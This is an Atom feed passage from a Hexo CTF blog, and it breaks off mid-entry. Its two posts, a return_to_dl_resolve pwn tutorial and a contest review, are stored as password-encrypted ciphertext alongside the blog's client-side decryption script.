<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>WinterSun Space</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://winter3un.github.io/"/>
  <updated>2018-08-20T03:52:54.348Z</updated>
  <id>https://winter3un.github.io/</id>
  
  <author>
    <name>WinterSun</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>通过return_to_dl_resolve技术秒题</title>
    <link href="https://winter3un.github.io/2018/08/19/return-to-dl-resolve/"/>
    <id>https://winter3un.github.io/2018/08/19/return-to-dl-resolve/</id>
    <published>2018-08-20T03:47:22.000Z</published>
    <updated>2018-08-20T03:52:54.348Z</updated>
    
    <content type="html"><![CDATA[<script src=/js/crypto-js.js></script><script>function doDecrypt (pwd, onError) {console.log('in doDecrypt');const txt = document.getElementById('enc_content').innerHTML;let plantext;try {const bytes = CryptoJS.AES.decrypt(txt, pwd);var plaintext = bytes.toString(CryptoJS.enc.Utf8);showMessage('嘿！芝麻开门~~', 5000);} catch(err) {if(onError) {onError(err);}return;}document.getElementById('enc_content').innerHTML = plaintext;document.getElementById('enc_content').style.display = 'block';document.getElementById('enc_passwd').style.display = 'none';if(typeof MathJax !== 'undefined') {MathJax.Hub.Queue(['resetEquationNumbers', MathJax.InputJax.TeX],['PreProcess', MathJax.Hub],['Reprocess', MathJax.Hub]);}}</script><div id="enc_content" style="display:none">U2FsdGVkX1+joLfDrr7oRRhGFz/O91SUp9y/aqNKlQJZRHI8jer3PlUSoaMQ+b6agW1R+mfjkkWsoisjADrCaShshjGEpbQF/JoDzR2PKrZKTQvEaOPqKyv3ir+fmW++qNWXGQh7ws1IUtY6W5W3qTVSqTQ9HiFj0W9wQ3PNM7Df0vNGle4MTDs6TxIqTiMFTCoGjZRcUsRNYQifYCExSSVZTedpWHGHbfACqIRUJp4CW7KEHnFlnmPadO6LMAcJPE6y9onI96g0amXrqr44c4J69draqBr7Rebh/XbQq1y2rAWlGJrWFD1T5fHkSoDnwNj5Kp5P092LpuPL70+Wgwyq9vgbUssmg16izTbR43G3JUUItnI8s6cTVSAuS/dTIzWu+Qo/mt9gnChjy3bLZpkaehO46rFFqkptNE2avyd6Ls1v+cs+XszIXwGF6jiKn21d767FWVFv41ruU1t5zlHRm90SYN+w7ym2H3oi0d3tey7X52klKlPM26J298t6vn60dwTJ2GbAdalgMibCLULXNdcJaK9vScHkMcxx8xfypZ6szs9NQkvDHyRLQ3WG7r64/7etLcbZ1pXSfpDM7RdYiggvp/Emtvv6rbdmfeQ2Ium+MJ2fDuoSwqbQt5U2e6ykCfFIxCr8wdP/jpG0bBH8fDDCAQuLDV4/esRE3PCWzWHKjkeyBlHimemnretFnP0g8wilYajTsRKNzD05puKm5QGuj5iujbyLNmBVWmjritz0xVG7ePCLLGE2vb+KSyhMfKlQc6kM7V9ZzfOHTOGOPlZuASlsW9Dc3uaAe65n0PCtO1mx1YvWCmKHP5qMXJUjxl3KJ2aLlC6ZS3ovm7RCQsr3TMZEkDkAN9JB82hmTSt4i/t1DWKdmoCoQVPU6UGosqeN2ig3IxfBNP8o1bk9qT7Btm4suCLgad7RYaMZ99cAcIsfNTLKdQEvdw1miffOMHuWbJIKVEMpbPdwbhUAiLdpoZlWE+Dx26uehNjIH837Tf8lSpBsOWC1sJda8Ax9G9ZELG7xO6cYR5I5Evu2DS3JpeNRMJDfTnYTo7S+nyOirxYldyXr/10QuM9wmepr+9kPl3yJW963d+Kgx6U3CEVfCunvg3mQUiGVAZWSDgspI4aWcgyhAG9bB29x6mBAIHRGLVBy7i/R2LcOvHq4dn8xZ+8XYqL9aA8dBbPdq8FddzycQsYZVPI5q9HtDhmwwnxct9Q1JopyH8VLOUwWNKKt12ogIGEu5zQgPXzNS7SLDLn/PYtajL/OAdWkupBlq2eaXmV5mSv3b+pO5GBvJHBBnDEPcOcLrUIADl0mBZKhPNLcv0WDrWZt8u/kxTZH4yqIe6q0oeokQAKf7/0aR3K46CZ27YWSBh4f53u55us98ntMSVWNZmFKcJQ2kJGD27XluzgMBMOeUuSM8/F3FY2+HSGYYIQqR1QgRwuMMYD0zHBftwHGEat47y1JcUmvY3dTEzQ7wshUgDeCGRJFrGizqQGADYLdneTgtAVC+tUq02AmBPdbOmkL9rXR6L50ew3ogj12iyd9utPbkdNBmxgQdowGIrx7fVJcB8ucqWNyCmnRsa7J9Fid3vihYiBPXWIAVrPqBFqjJsGS9kvB6fk22LaBFvlPnSih0pl4l4Jth/NeNf2dF1DQHJNFdI5kbRulSRnTQhbj6+ZJ3tvXBRJtx2w14TxGsrrdK7g2ukwhAZK+wnEAh0feizTrcRXD7V3ZGiC1P2yfFxZ/UbqTYbs4sLzhEEkq0i9vpRowx6ILI/jab+9dRCxwr01lRNllvxsx7vslCMooGBsU2epMOLcRIfzTudSZ/9zfLCeuez658YCBF+PQjdMQAZgXkEkiD0U5bfuHwTU0fqAvOubsLn8bIh4DLeEPvW53MsBMkFRbFBW3IyimKGMZjfhFMchYUqGnmJvnEeg2mnFDoJCf6BrW3hKW1FvMlPYQ8hCTuNyq0QW4u7y386HkckEwFu52g8TxWYcbg0AE3GRN/PZQTd2veOsupzF4HFvin2lKfXrVVx8pdhe5vB/1yc6H+bG2C88Wz8DClPK3jVVjusi480E2GngGe379LwoTxBc/W4JRLyyGaobGkF8la5oLZdQ1dpDhJqcZODYmz0M9+osy1eqMEHCuqwO+9riCRA1YDJgqRXbcdEU9DZKibaYa2dVVmpjYuxDtAZErjhD6nDwATK2WICw4QK3wA8mhz9gTeLgdmVh1lsaezGu15/EA4ALipeZNhNV8WPIf9wYZ1mEFJCCz52KyBLernacf1VuUr7lITVO5y5arGFw8+CRWisfEPl5rsFj0Nyjd/Datduckf4NPnFwXOMv8ELe5gFWoQkwbwt1JdYI82j6E/Mencqk1GTirQzpu3X4hVqIp3AIxivK10Vi5vF0uhfPmHqazVsFFzn4jMCs2PmpAHtPFg+B7c3E32MJKTwjqZlKFfy4WfXirfkYliMbZMLNBXxq2lQB6CW9QWbBiLZtiQCuUuVn5/RDrWPYpDZtd/zDuGCrbFkQ3ckL3F4s3pomiQ7CbiQ7xZvyiVfJPkhqCm0o15lifQ67WiWFg5hOYtq20GLABAEDQHBQ2juuI2xTKXUlL8zdhCifM9r4R4bDoVg17MxFcGCru+dloLCODoxUpTy7NKfNbYth2Fh83nvLJydG/c4Kl0jHaF8tZP3Wqreug/8VmSJt7Fg8CLkgxMtm/3mv+3EDEXtp0r/8BL0iNyySFNJaj4kTeQ5KGWmXG6LHSsqiUcvTrYefBxEoSH5GgVEY+v/bHzb5k1ubAra91GUvfUZ/ys8UxTeTKFssGHExPDAMu8iqXPAWTMkU61/WtTlqvaFgOfCTi3sR6N7TfWUnx+bwgzNJrXqcdZZ0PzMHHjQY4pCLQvVxLB9GYtuoRPsZzxTlvsRLK0kFYjKMMnkWNLOKsh9TafQUgv7drXCQneozU6UBBK5h8pLvsvbxKCtfH5q5PH9eb+xb5ZZAi74PFwKEB5tevKowogEhLFdYPmeQV7VxETubqhgU7XrJpe9QIqxke1b7H/zuwLM1lVzppb2ljaaxmMej/LaNyQs36sERib6iYbHicezrqqA6kHEsgJkjNb0auZFyE3mC6eiusASA7mmgqoI9BgFfLgGl/+0CsYbE2mqlIvjxGhHY4Z0Jps84gp4TizYvvoTKKeWZbCvYfbcxFngaUpI/ilGdqSD4LVHjJQXqN2mnfMmIFEkseToftZmQwx7HREaBvth9zM8q0LEciSYJVZ7i0rXeAgo+HNiive6lYuHYfd32DnTI1RCgABGfhSA7lOKYLN06fgGxg07qGjxyYTgg57W97dHe+bb6dOLmfRdprvq82y8sEzw2GoYTssNPVg3R5umvxnfl40WrGr9ywd4prMrfH3qDHaVLWRnJNOYLGD6WGHjNnvd4mZnQCoGPJYkhxJ5rqN0NiSP7CFdkVHr6yBBGqPDCDMgUgnzuNnrOYrP++6ujE/oSPrw4+uXcO+ftSuGFNHK1u6v4A2T4rCRTzTF9zyuaCZZ++or+AasZtSERjl1HuHpQdtRBJtnPZ/Xeh98dFUED6Rx6aHcdD1ExKWjksrgiD72GRJn29svyzL4fmDdG4RSFmZa/gZF9zkJHm7wHl7POuAbBaL0xJlxq1oCa0leJI5wNMY7gxklOKzo88xF+zRlU/0xOxqfXBpt/qGIi5bs4nN7ekgyI+dHRtLvgR8D33ahnjQ8g0UpWWVaFTTnVjsCAbMFjOLkSF2nTcPuV9kUn8HXdvVJzPk+P7DAy+/EonC99A75K5u9pp0C21BEsOe2iwIA/8qHnahAaYXO1VPmO6q9ggJtxwVATC00depATC67DHXPC0OlSDOKBE0a2cZM4xtt0XnnN4OBUQC/U/nWHn1QP2DQUvFm6B57YWoTvAJ1FpH7fgJ4IXZnFcQ8NHxfCWVblDQTDl1S7OrfMD+uqOJG+GyzUDJdCa2n13Py1pMbz3S+P+1+naOcxgAxSqfjO/jFE5WvIOTDBr+Rb+SO1GMvNe/4PkUyFixFWqi1f4itz2MeHpKOAMSr8EISGYEmyS/xbbZ1O9VEKN/vBezUUrOASLGmseQu2LqepvY0uNWiSQw9/8PdKt8QjsfmnCglBM7CWZTo+ACG1btTBVbCfLP1Y7grt+x1/gZesgx+ZYPHs9nLOBYgQb03uxMMU2VpfG8/7dzpgCSj5cV83crolbQstWUSv+2WwMUYwvm4Y9BOAh8Eaiy+kOMJk0EH5ZtMQGBdc/qmcAPMkjZNPACzDVViljdOuCCpWjS3tQ7sw4mWJV5z20M3R6J8MidLPpbMLK4+4oEx77Lu8cPGFtKUsmjtZ9CPNrzF6l/eMGHSmkNd6jqkrTkW3Hwlmpw1ZnhVOh6WfOwNU8wW5HB80NtdTYAh9XKiQ7KNfPcgD/i5FdCP22Qf5SzEWkYavUc72EkVibxPhett2QEGAAtCI/pbKsCWXYXY5aNf9aI7kDsLCfIHZ/ncg9HwALqGTeqamXOMAXBwPRQrpumSgKYebhBESKkooroBAjwd0spLOXcjMYnJaKMb72zLHICeAzaOcNPOf8Kt9dgKe+JrZ0mIi7I8BFKdlJ3TJZWY8H1Ct0YMMyvv11c18il04CidMIkl0dsh5ZkzclzLRFN3Vzp3ubadci7nISDvdhI5HsnWsK0gqV9aIcsPDySzV3qNAiWLNcW7uq7nlsvWVBgrJDOp2Ri2LfICB+UNtP0jKIn/BJsdasom+H8uZFWYR9NhRxRn66KJw12w70CxLxCBUdpAVsm31QLikkSPr02i4bRLFe176IqV7DslO1B7jGwR91/nC13LT6Y6w00jNPwZ+43Id1+ZpZWKpz6JQAZrbpAsl0SNh3fLtTSBRAqU4GhmN/+W86V2/6Rx65swEjfKUAkSKP5FLwitSEOEy8NGvdjsdRje2BPpFWmoKljAWl9RB7TV5Mzy+2nqBwQxzG1Z6VBW1qgPzcsrM40y50K2k1+/Ctze65gbQJ+C/XSs49HNfUfDjn0Xgyzl/ldXRx64bP6Cq8+8YMxv3A+KxNNprVL916IUepPHJuIq/GQAYCGwr7BUHbz1R9prpTbta0EbIfOxVR+1c1OTP0xd+0VszHWiT0eeYk5T5u0njsyFGNC/nyytwjSzuqeF3Vsjp7LScy5j7XH5joQiUdGXogoHn+l1ADwMIQlrO6gwhk5vBtrk6Tn4ciDA2TbFg3FzVrbam1U9O/YpxE/w4eLn/X+kDGJNJv9WSufT1RVjy/ydDs+wiN3sikeg2WuBsW1jvgPogNnEmQ9drS3PeWfzFWKe9p8AuWLr9SsZ5zchzD/eGiuXxrwCGYpRhIxQcwOAZ1XQGpyB7c09Vfncr3DIezD5hGd2x/zgCXdhlW1VJSy/YU4LmSlANCJXDrTbBntQLsxQq+5hPlGcJLn4K23WGwCvf5IMGjMj5d36sCu1ISRrwn2TRkIGF3q5sAbvGR2vvMcQbYuscENDGLR9s1ZEQNpGn0acNtMom9srUaAb0xDd1aYsufafzlJfca+O9vWut4AEm+xzEF9m2z5NEPioTzjNFly5CzE0OFeRXY2DBOM50j3Se5XNM7tr1JIR06S+35t9ZpNHHq5kXIsq6qWcZdFkMQvJI5K4YPSfm0npvQT5HF8HJFuuPj51ij4AzDROJwRt9GXSLq8fN9jJajX2fR0R1QV7lSH73EjF5okMFgVBX03h/1NW/7EkAFUMDercfDq8oiyYbJz7qyGjlgFa4792VVMgzMYx31hNyWxbdVJYnNB2Yblqs6x+CemItk6hbbjsq8/kLFcTnPs9Srs00scGy0rniPqm5tE3zjsvKlUsscXmRSoB43j//7w+LRoMrQVJbeVODtNXUPBcMELlEbgJXbpjTgvanWu/PFIDrtl69T0gokZ3ADqf2JemlUEbMIR/DPJ3OAvNgkJX5s/ofWtND6u9haIMKRAvNlek6xVbNySNZIlGMxPbA/IzBsKHcJibnhaUANF9jl91XmbmvT+W6HC8njFmJvj3uGCNVNah0dJqdjMh5U+Lv+OpkhIn+Bxuz1AjN58iQZY1zh1DiFRGnDr1v/5bsfPW1LO0xdtVv6OXZ0WNep+cjNfKrb8O6lPfkZAYr2DeNAWlAlM9Cr9iX3qpU1ZhmvgH0hyg62B9WDi7dBiK8c4XztsgzekEoZZEU3RYyMltkT+Z79DZItfLHGUdkCRxZ1Zsbt7Ox4svhJSLXnfkCigavaG3JlZOUBMjhliN4v4oLTUKLz5sCvGspm16ubupV/wld6kBSIZTztFbmjuU6fjcp79UPlYbGpQ/drr1VqWM5jt7cgSiUQpq2c8RLb5JFdzX6aKzZYvtoe+z0twc0zuKN3qm7jwuoCKMkxZCBAV0VeOFY6m0IG0DTFYd2eM+1twSauvw9PMB/v9GP/CsIH07amxKznNadC2QK6Ehgo5srnUEp0L8KLdRRcB5WRHFsWb18EvBf5asZgltty9gpC1hW6GKOPHprdD6Pcdjqn9fzyskxdz0vNlDHr1Z3VhS97ata65wGL3vdzHPYgWrAhDX7+xAGHxDSe0AkYdrjyFL8uN51bnmpMCCzcFevVVWY3Zn0J+pvK10oTG8yZzJkPDexK/HC5yP40ZQlkORS3Ys8/puKVO9c18XMOOO9kMnl0+JFKLVfTrwkBmmvg/otXT3TCzAdS8YZcCYOn1puFysxOPTY2AObg6K8eA+XaGLCK3rhX0OxzyEZJ7kPmqTSymF54Ci1TtpKkqTW15QELimGMtBZZGE1j+jSMtZMAsicd1T7wIStdoYnjwh/ze+YbPJOmuvK8JvE3x6U9R7qt8DAndGz+dV0+FHjnwNK3HUlS+bM+oJlskddvffUSXS0VgVCM/CVeVO0YvsVtgpzjX/uIO6JWGnRwLOz1rJqo3+OgUA7GX4t/KYu/ETg7P5ybtPYV2UqJK6Ggngg8BphdmAWY9igB+/Ft425Hc6qXOOSXk5LDtM+Ckjl0mWxCcFFVxBV3V7y3N+lUP0nJjQwWJUMiDnb9+3HFTH1T/T20MmqjqW2wA73uPixBW4/dF4nAu/wAdZYKLEE5JZfksTlf02lqeWweBi55C8Hu/X6oD+r6t+nMvSUSXoy6fZNk80AofXJExi3M4IF2Pvp8KNGWt4y5snL3C7gC6AHM55GEggYvMgSgjls67/z3q4tRqStPFxXlcT7fl8QdEkViDAQOdVB7gWtZfj8S1DjVlwF0xNLu82P5lhJCFIkbBWIfiMUKGPL8r1R/0ziRzdHwJaAoF5Nt1uvwK67IwAB2cfeJ/AYsyaWfziHLONDoEcvT8n3QDFAZm78Lmhm3MPiU96Zr7IoKeRjndDcJdPKAnEf76WI3JzIQLVnoE1I8pKoMsfhhgCP8Xv1Uitb1FmVi1JpX6+JPUf2e66x+4O1sAthdZHJjIc2b4rdcp+HIzs9GsNsookRwmz5FierL4sZwDSBKAJqiV3nDCWEA/TNpnUveCGdpqI/PM2yHFyXZUYP9dBtMFw7Dz0jwqmwqZ7L8ikUt4TJbvsp9v7sd8N7WdowowVVu+a0T9KL6TPMkhXf2rM435gZCicBf93I9vb+rxkghayM05DNYGFQ89Oa8659WUKrEWIVzfiDPz8Kx3qRVxsmpMjkyEC/viL0ZDHeqdQO9PFH8vi1x0vV4OR8FbYENxy71sAGcL1/A8PcchuBitICY6dv1sFufuG73hGWfKxLohDtTFt60bJ8uWOZttae4K4U+4hzIGHajU1TxrAk8EtetBqRlDVugW0hOKwFSfMZ6rBL+yEVUzMDd1J/hDB8GOMbHUW2F5JacsAznLLvkjt8ZKoUEQnAwhwXE/wK8kHb28L3y/gXwaaFezQGOYWTeViY/u5iBZMqAk5TPD5Hn/J6XGNRvutpOMJMZhJ08dRF468umpDaS76IGFOI5Z/JVJoXn+g7SpA6dVYD66LiC7gwiNHg5nFC03lf3KWQMJZRpzdNetsc8tADddA6k2qQrBfiiNTCHMCQuZz9YziVmg5/uG6+0SAQ9tlex+1BKFsLTJ+WqpZKJ4SSFKO1ADHCz088uhzppj0dfYTUKFg1oxxY1+reFvIoduS8lHz6TMM2Et1/e/VxjJJyuE5HyBR4lZIjvT+6DNlSzcgNg3IBYpNphfdXiPI8ESiNBHJ/YETlYSw3teobwk9Tj9ijx0Vy0lFudGr/lzo5za793TcBz0F2DgAdmo3eohvLHqULBrFm3AHMJBCdjMj7ldiChudz/ejtNDuwB4vnGDOYOLlfnveG/BGFUdrwoDjNv3Sa4BkaPT/fuwlV9gjU+mAwaPqdb7j12IEv6JLy8Bj5ParWMJQdP9+UMtvuc3JPsUma/sg+nHNBGEKG7Uj8NT/mqSYP1TgCGtkSNttj35TPdNVFvh7ehonspabAXylAUDAMJ9BbLhX8claTGpVhEHPjPQLURRZxRzSmZI9FqwQYCHjabSEea0VH+J0GSFdZHx51UQo043YQUvA0cbI+f91QZGuJbRMrA603wR8NlxmliFl+FDOmLU9gSpec9wnYH1cptSIiT3yz30n71vo7/T+MeV3ud3HqGq+2u3RVvOy3AxJ/Q2sV86TDzDnxnFkYVS0fCaOjwf/bLmoKFXG4HMOxIsZHG/tZbMYI0V3SKww5vsq0Y/yoTue4VQ4Sm7Pp9ZqwW841T11tlT6LWsjdaWzUC9IdYkNWsIU7tFpeZDEafX2rYJT/6arNRDv9eKJJMnKXjzL2A1Waw3UIPcnujD79Q2Fm3nlBmbP3pYHM8Vzc9Ey/Az3HIYJyBxAvp8swZRwPxAMuAspTuJIdXYxQBqvvLIxayDlzK/2yy9dwNgBiGTwnFLOtO87tlHV835QH9ASl0arHIBlPRiwIFyrOdZntn9dJHlsOdT/XJ4jk+JQq6P4nJHo8aAnPKDdRQhmL2omZQ5dLECFt94ek8yIINsUEt8naE85RngxrSfk2vYunfIqNebCgFyVznowlIOizmfvaPzDKsWR5TXOi6oQ3/GW6SuDAJWJ3UtboFUZOFLLfYufXKKwjI2AsEUgWcYQSLVD8AU2xNykrVpAxjJafFfwEPmruhph6SuGyJ/raFUguizmFJg2cUj7aRVjb8nl2EvHzUH1w76N2Us9PCBAZLymk3McI4rjiBrKtW00GIeOkDheSfwc+NyJHmo3E+V9YxRa9eHGM4gBZbOlqkm2X0h2EEBZj+WIVK4/ERx0jj3W/5qRnxOp7d8d6NyE7QIkMWJgOtUgz92dWNS+GXuuN/g1FVQrH3l8gcz8aLINcSGB4LIYqUHhwnPArYfWpXI1Muyl7mOVQPd+k4u1T6S69sBEVj5rG0WHrBWQ2gSllAt/HS+AVaZegGR/3AQoZka7zmTmSxKD38Xmq7PIeTOjF4IxRjJ5KbMo3eTew+IjQZt9VMIj9HMBGLslU6c4TOwTHio43rHfdFolirR+JMaUOWUTws7CtaWpECCYG4lVPZVaJz6yrX/Bair9bcinNuGgl1i6W+B+fa1davx66IRgSwwaK2Fh6Nav7b2W5u1NFfjLobkEvpJWw4XE9hvw3r0iaTn0WfOjiAmjtmYufrcnGYlletePuXbTieB6uUOaPj8d+cr9+Py8JPB2Gs+iy2KNNHhA08PKysOEn3s887vx+Qb2YTSV9CoYHrxKHNiPqcvbIwPBZpAZpzRlPkt/HAHOR+abRTIzQTi8HbvV0sVDRsA2DFllMJ3pnYL5PJK8OkoEjCUJkc6Avf7///wjSTdJ8kgxlShhfqt6YdHZsQY68nHx6g0nznjr+NlQbBah3gZdQoOsw3vhL0BLt2Yu8/+34iNlO4tMqB4H4D7+dQGZ8MCcTZvLLubusktyRTYeveoTmj3m1mhRW2Ila7ORXhIH/DhIaMTffariBKZRUMGKl17uRZWy+Uzsdib4IVTnj1jSKlfz6PnUzMyXIaakHNH5bxD4Eaiz3W7nWA8bkhoj7taIWiF2wA86oD0xwgRjqTkVV6UNgQiMfl96rw1qvU7YXY2C3T8r27w7E+OTRgQrN02dehLiZ9xcxOqdlzGYEfICoeszcn5TTsAXlSekTBDUSqjWXPuLI0sjn199i2vsb7QAzlBNiCUZt7MfevNb8GKpNhj118i5VFIkrSrMPdG+SAZ1JNJyFPiZEBIrm9o+PA3MRX1oB2m16clN5pV+2DbdyZhLUlafbQ07RRHfJGJXJouSrs+xS1o05eZT6EQLxmyKigTe41PSrzxxmFXpzbkD4dFi2CxDJBU/mGi5FKzP4oP/yDrNu6pxYEDkAd/A2DSqm4umlr0ys67J0Bz9viH7wiElUI092sj2oktfkOkm/CVpovRvwi9OAJNyZm8QiWu+wgbAFUZMohJpdWZeCo9jLOiO+O5+vxGN4LjfyaAemla0n+VaTrkmDEh/ak4Uku20STurQJD1Oag077TClRPIdQqXlLBuY4sB+GzMAC2mFRJp2rLkJLRKCJRxZitcunjzAuXwagGf0AugRgCPbfDbaOGCn/A2pW05UVurd5LGae8rqYTLjUqeU/xoMBC/D+nxleVl8gdgn4896Bnc6g8ybfBybUCoAc0+UWvH2PimqXljs/afUtRIpzHaX+djtrj2fs5bHV7yMo9FdNyqYvMmBvjkGKUa1VuLo+SkjcUVJLhiiEWZasja0YLRSBMZ7YpX4hNyBZftV52ci5/yVVkuxuqQ/7GekVHTLW+VyMd6KDTKASu3hOzuideW7Ih3SNmPpdAAnLHFIoR0xBGs+R4BjHJpn15OXfPyHMfaLiiVUPGeJxbubDTdKSlEM+HMcPVByE/P6NklTDd4rnBhb2LfgprAIMqWu+nQ3+sppp7Va7Gzm5X6bvi2+Gw1kCV6o8ut1ykk0d0gLVB9fNMCovInjK2aQecpTpo52chlKsW86fYAYubhg7z4X3N39swI3+C1iLmfGKcc0MLLwbb8rTUJXgj3Zly+Xh8bsTR1tI3tU4Sko+/j80YQtl0K34mjZOaPsaLBEy65H2HX/er1GrJMMpdocrxNFUjDSpCNPAxqXuu623mEkGHzJzeKccUr3BcwmFUA2Od4qyCl1Ceu263ekAJw6cveEsQu2Sy7cVpTPoFQ5kI5Wlj+BMaGZYhkKqtVqyvzKo7h02pg5JLiQXXzK8AbNWO6wtiOf2Qxm5S1MefacFwHlgHhgz/XZJhlINh6Wt9bNUTOredgrKGvUPD7JRnbnqggz1tAJ0sWsRTTLErM9s+rcrc2oeLiBTpRSuZ2jEr5gga967ep/C88/ENeIBet34O76qhCPo4/pScitLWMPYCmsIOwg1kuh612dHpg7Rn0xZhvdgHA4uNx+8owGNGUpDrhwPFYOhn+ts1NgpeGENpobgD063PkLWk/7LzH/tVFI1a1/JhrssXWODsbY+SwPZFQA9/aM8iXrWwOMs2FvVaInpZHq0JpeURr6vRMhr1vZPBKlIME6/hd8ktYFXgpvs1fKf1FfKQwnHHmDkdUuPVjpPbo5o4CTt6LkuSBA0NMK4yujuhrQxRfZjYGODVXSyTSZPdIQo/25t81GZkdhNngK8fnILWyCNV2ZJ2h0hKofLL4AddGh/BKjnD4KrQqbCvQQPZWYY57Xyy8pkbh4hWWQx5+A/nE88/dv2Ss+cCvPxmjlSdJkGS9qXok5B+WktIbtk1hMQ6MDzdUeqFu8UH03iXIWH62kYVQO+4WNFk4Q01O+jiBOuMDrn+T2FFm68iB2Ju9CQGO1CdsheCtKrvptu4Tr1UogrO8dxy7LbJki+AORqO0SFyVyJvLukI603wvzLqE8iOyU8H1jRSNhwWf/rpc7DYaqhrMf9jwoDkpJw9yn20klQj6J0E8vj507QaBa7s7bsI1xqdK05Ewiqzo52i7rLhLB3XQhpxeBF8e+pEpafk5P3uQe0NQpKyBzlK6U85p/nBUL3mR3YEoW9U9ENb+/dzgsCME83OcWvX4B8Fesp5v1KLsZCs4JctoeIT/quXQLtvFZ5wVJzNDnwo8pe0Kd4JEI+M2GjxFMLaLKG+stgcgR6yjlHbPgYJjg7dAQsaIajY/qqld/v9gJo8EP7OegzxpvwK+h7JfC+n0yykpVvZYtebIOJIyF+MTKpk0Xx7z7ZzAywyvYSldtNmStS0dUIkNOFrdCqSJdxYo4iSeVsSKkHnjSPwMYKY9O3OPBSv3LW1FBb1cMeXqROoTEPJUnmDDB1eOaHsJF4VBQkidbQqbaHVi+SfRkoAWJ15TEfpE8ZuP37XnYbiC0xjUCk88rC8/dmFXlUwNHxHAy9EzYHG8OdABEsZ9sFZUagl6VtoCFMUUOk9zGg0YQOkrYOED44jjIzWT6LQopG9Ats6juYW/rNK+jHYs58BdqxG0AOsvcdxUZgIuwC277teQMEzqjgbHxgxnvpsUnvPohC3r8ScHThO4wt6BUW6LwMLhb5onvKYuLZ847hRVHac8PfrJ9NJpgYmmEoyzqQB7IsnlTBSTUiH7YlanW3S1o4gGzz2/6FuD97VPqeGZX/wbi4UcgcxSDdyZUE8SkGGf+JnA5wfm5WsPDEwoVA+puBdbrU3VL625bUbF6LsKn99LUKjfLkLqHnWm+wYjMjeiP7j3MTLZD5BD0/FquASigHj3FO88q8aTuIO10HY2vfYUTD2lMqQUIa17aRLFuKXcf+cXW9e0QmcvMkaj4sUObA2wRsuaLv9x8AUiyQ86xTBgkEqwwLu8R/mcQmEXaBx26Hrg5AeVe8I7KNsQ7qF/NDhSmQOcte0fEM6IAHCuj89F5F2iGeehd2TBqr4mAx+BAbkIfvooj0lrPpRxWTqYj0enCy8ntNGsKJRVnu2ACHZfh4Irj7bjviE4W7AuWJXX/DFPsh08Wi4k0MrbDJXntyxuAL1oabCpn/oPinQkprc0n3cxXZzaJ8TzZnMXrBcr5Z1vVa1xclSc4xuwsvpbY4QwetVMoYCIG/1Lv0gZhlAal9K8eiaKLkd7FALwalUF/URDSSrDH2Jvyx3ps9ip0dMg8xRLHWO4derUwXT6vVWbA5loQcXJ5AXqwi6qIbjV3hfwDJrTf++jSdLPmF35UBETwJV43638OXk8CeZ6k1DLLA9TX9vz7Hctxh5VII7PqzcgmDkpgPCfwgqQyo7SIt2dXzEjdiPwlhOibMdpZ+doJZrHQGzUkkTUJ6IUbwK8QHELqnb3XDYcGl/Ig/54N0r3QCvvlJH+iAm9sHw/s0+BXgBStqDJYocyvBhFKlM6LLPYhC2SAUuvmjBP46nXlNJiDc1pqFw591rf/dkFiwDsHfD88CM7IJ9nAA+x4cTGJjYhRI+g4XN89ZAB6m0wbrrfaCFteOQcBYzIpm4Ak+SbQBcyWznl7Nhl5CE+UESKNvZkh7OXPPKa5ttUSZXplmEOvO2ORrjZnXsFVUmo1UrgEvJLCeAdzlcc7Sut7n+djan6MuDiUbrHgCnmojm/3or0dC7BK+sWnP8geCzXPD1pSaXkXz1G21G/r366+2sYPRj3SRRPROlNpssTX0/F/10tDE/yPfHkV8za6ZtUncK25DC+qu4LacT8ENwRWBzK2rchVZUcFSAmjT7/uHxdqhY4EjOsnqlbRuVP3P2AOQCL1+lfuY64NWQhkVgluE7P8DAhCByl6ZtkOWXhBpf33zxUvfNpJ1GvQWRbT71UokxulYUc9+rHxVk9WuTiP+UK98vErewspOOHeqcKG5Wx7pcKUiUVYzovCz9yfeNfqD0+wLDAzI6uUzwtJlkZBZqwdr5tp1OLO6OX+IhOPm+WHFmmnBR+ZEnZ29/jOHb97+ZiACIp9DDQW6uEmTKzDahwrLcSUvi1hmNk1JGov7fFLkbakuc9VUcDV+HMPt8KgzDRw=</div><div id="enc_passwd"> <input id="enc_pwd_input" type="password" style="border-radius: 5px;border-style: groove;height: 30px;width: 50%;cursor: auto;font-size: 102%;color: currentColor;outline: none;text-overflow: initial;padding-left: 5px;" onkeydown="if (event.keyCode == 13) { decrypt(); return false;}"> <input type="submit" value="解&nbsp;密" onclick="decrypt()" style="width: 58px;height: 34px;border-radius: 5px;background-color: white;border-style: solid;color: currentColor;"><div id="enc_error" style="display: inline-block;color: #d84527;margin-left: 10px"></div><script>var onError = function(error) {showMessage("嘻嘻嘻，密码不对哦~", 5000);};function decrypt() {var passwd = document.getElementById("enc_pwd_input").value;console.log(passwd);doDecrypt(passwd, onError);}</script></div>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;比赛中常常会遇到基础栈溢出类的题（并且开启ASLR+DEP），写这篇文章的目的主要是构造&lt;code&gt;return_to_dl_resolve&lt;/code&gt;技术的32位与64位模板，再遇到类似的栈溢出题目时，就不必再绕很大的圈子做了，直接秒了即可。&lt;/p&gt;
    
    </summary>
    
    
      <category term="pwn" scheme="https://winter3un.github.io/tags/pwn/"/>
    
      <category term="ctf" scheme="https://winter3un.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>2018_807个人赛复盘</title>
    <link href="https://winter3un.github.io/2018/08/07/20180807/"/>
    <id>https://winter3un.github.io/2018/08/07/20180807/</id>
    <published>2018-08-08T03:39:09.000Z</published>
    <updated>2018-08-11T13:40:27.781Z</updated>
    
    <content type="html"><![CDATA[<script src=/js/crypto-js.js></script><script>function doDecrypt (pwd, onError) {console.log('in doDecrypt');const txt = document.getElementById('enc_content').innerHTML;let plantext;try {const bytes = CryptoJS.AES.decrypt(txt, pwd);var plaintext = bytes.toString(CryptoJS.enc.Utf8);showMessage('嘿！芝麻开门~~', 5000);} catch(err) {if(onError) {onError(err);}return;}document.getElementById('enc_content').innerHTML = plaintext;document.getElementById('enc_content').style.display = 'block';document.getElementById('enc_passwd').style.display = 'none';if(typeof MathJax !== 'undefined') {MathJax.Hub.Queue(['resetEquationNumbers', 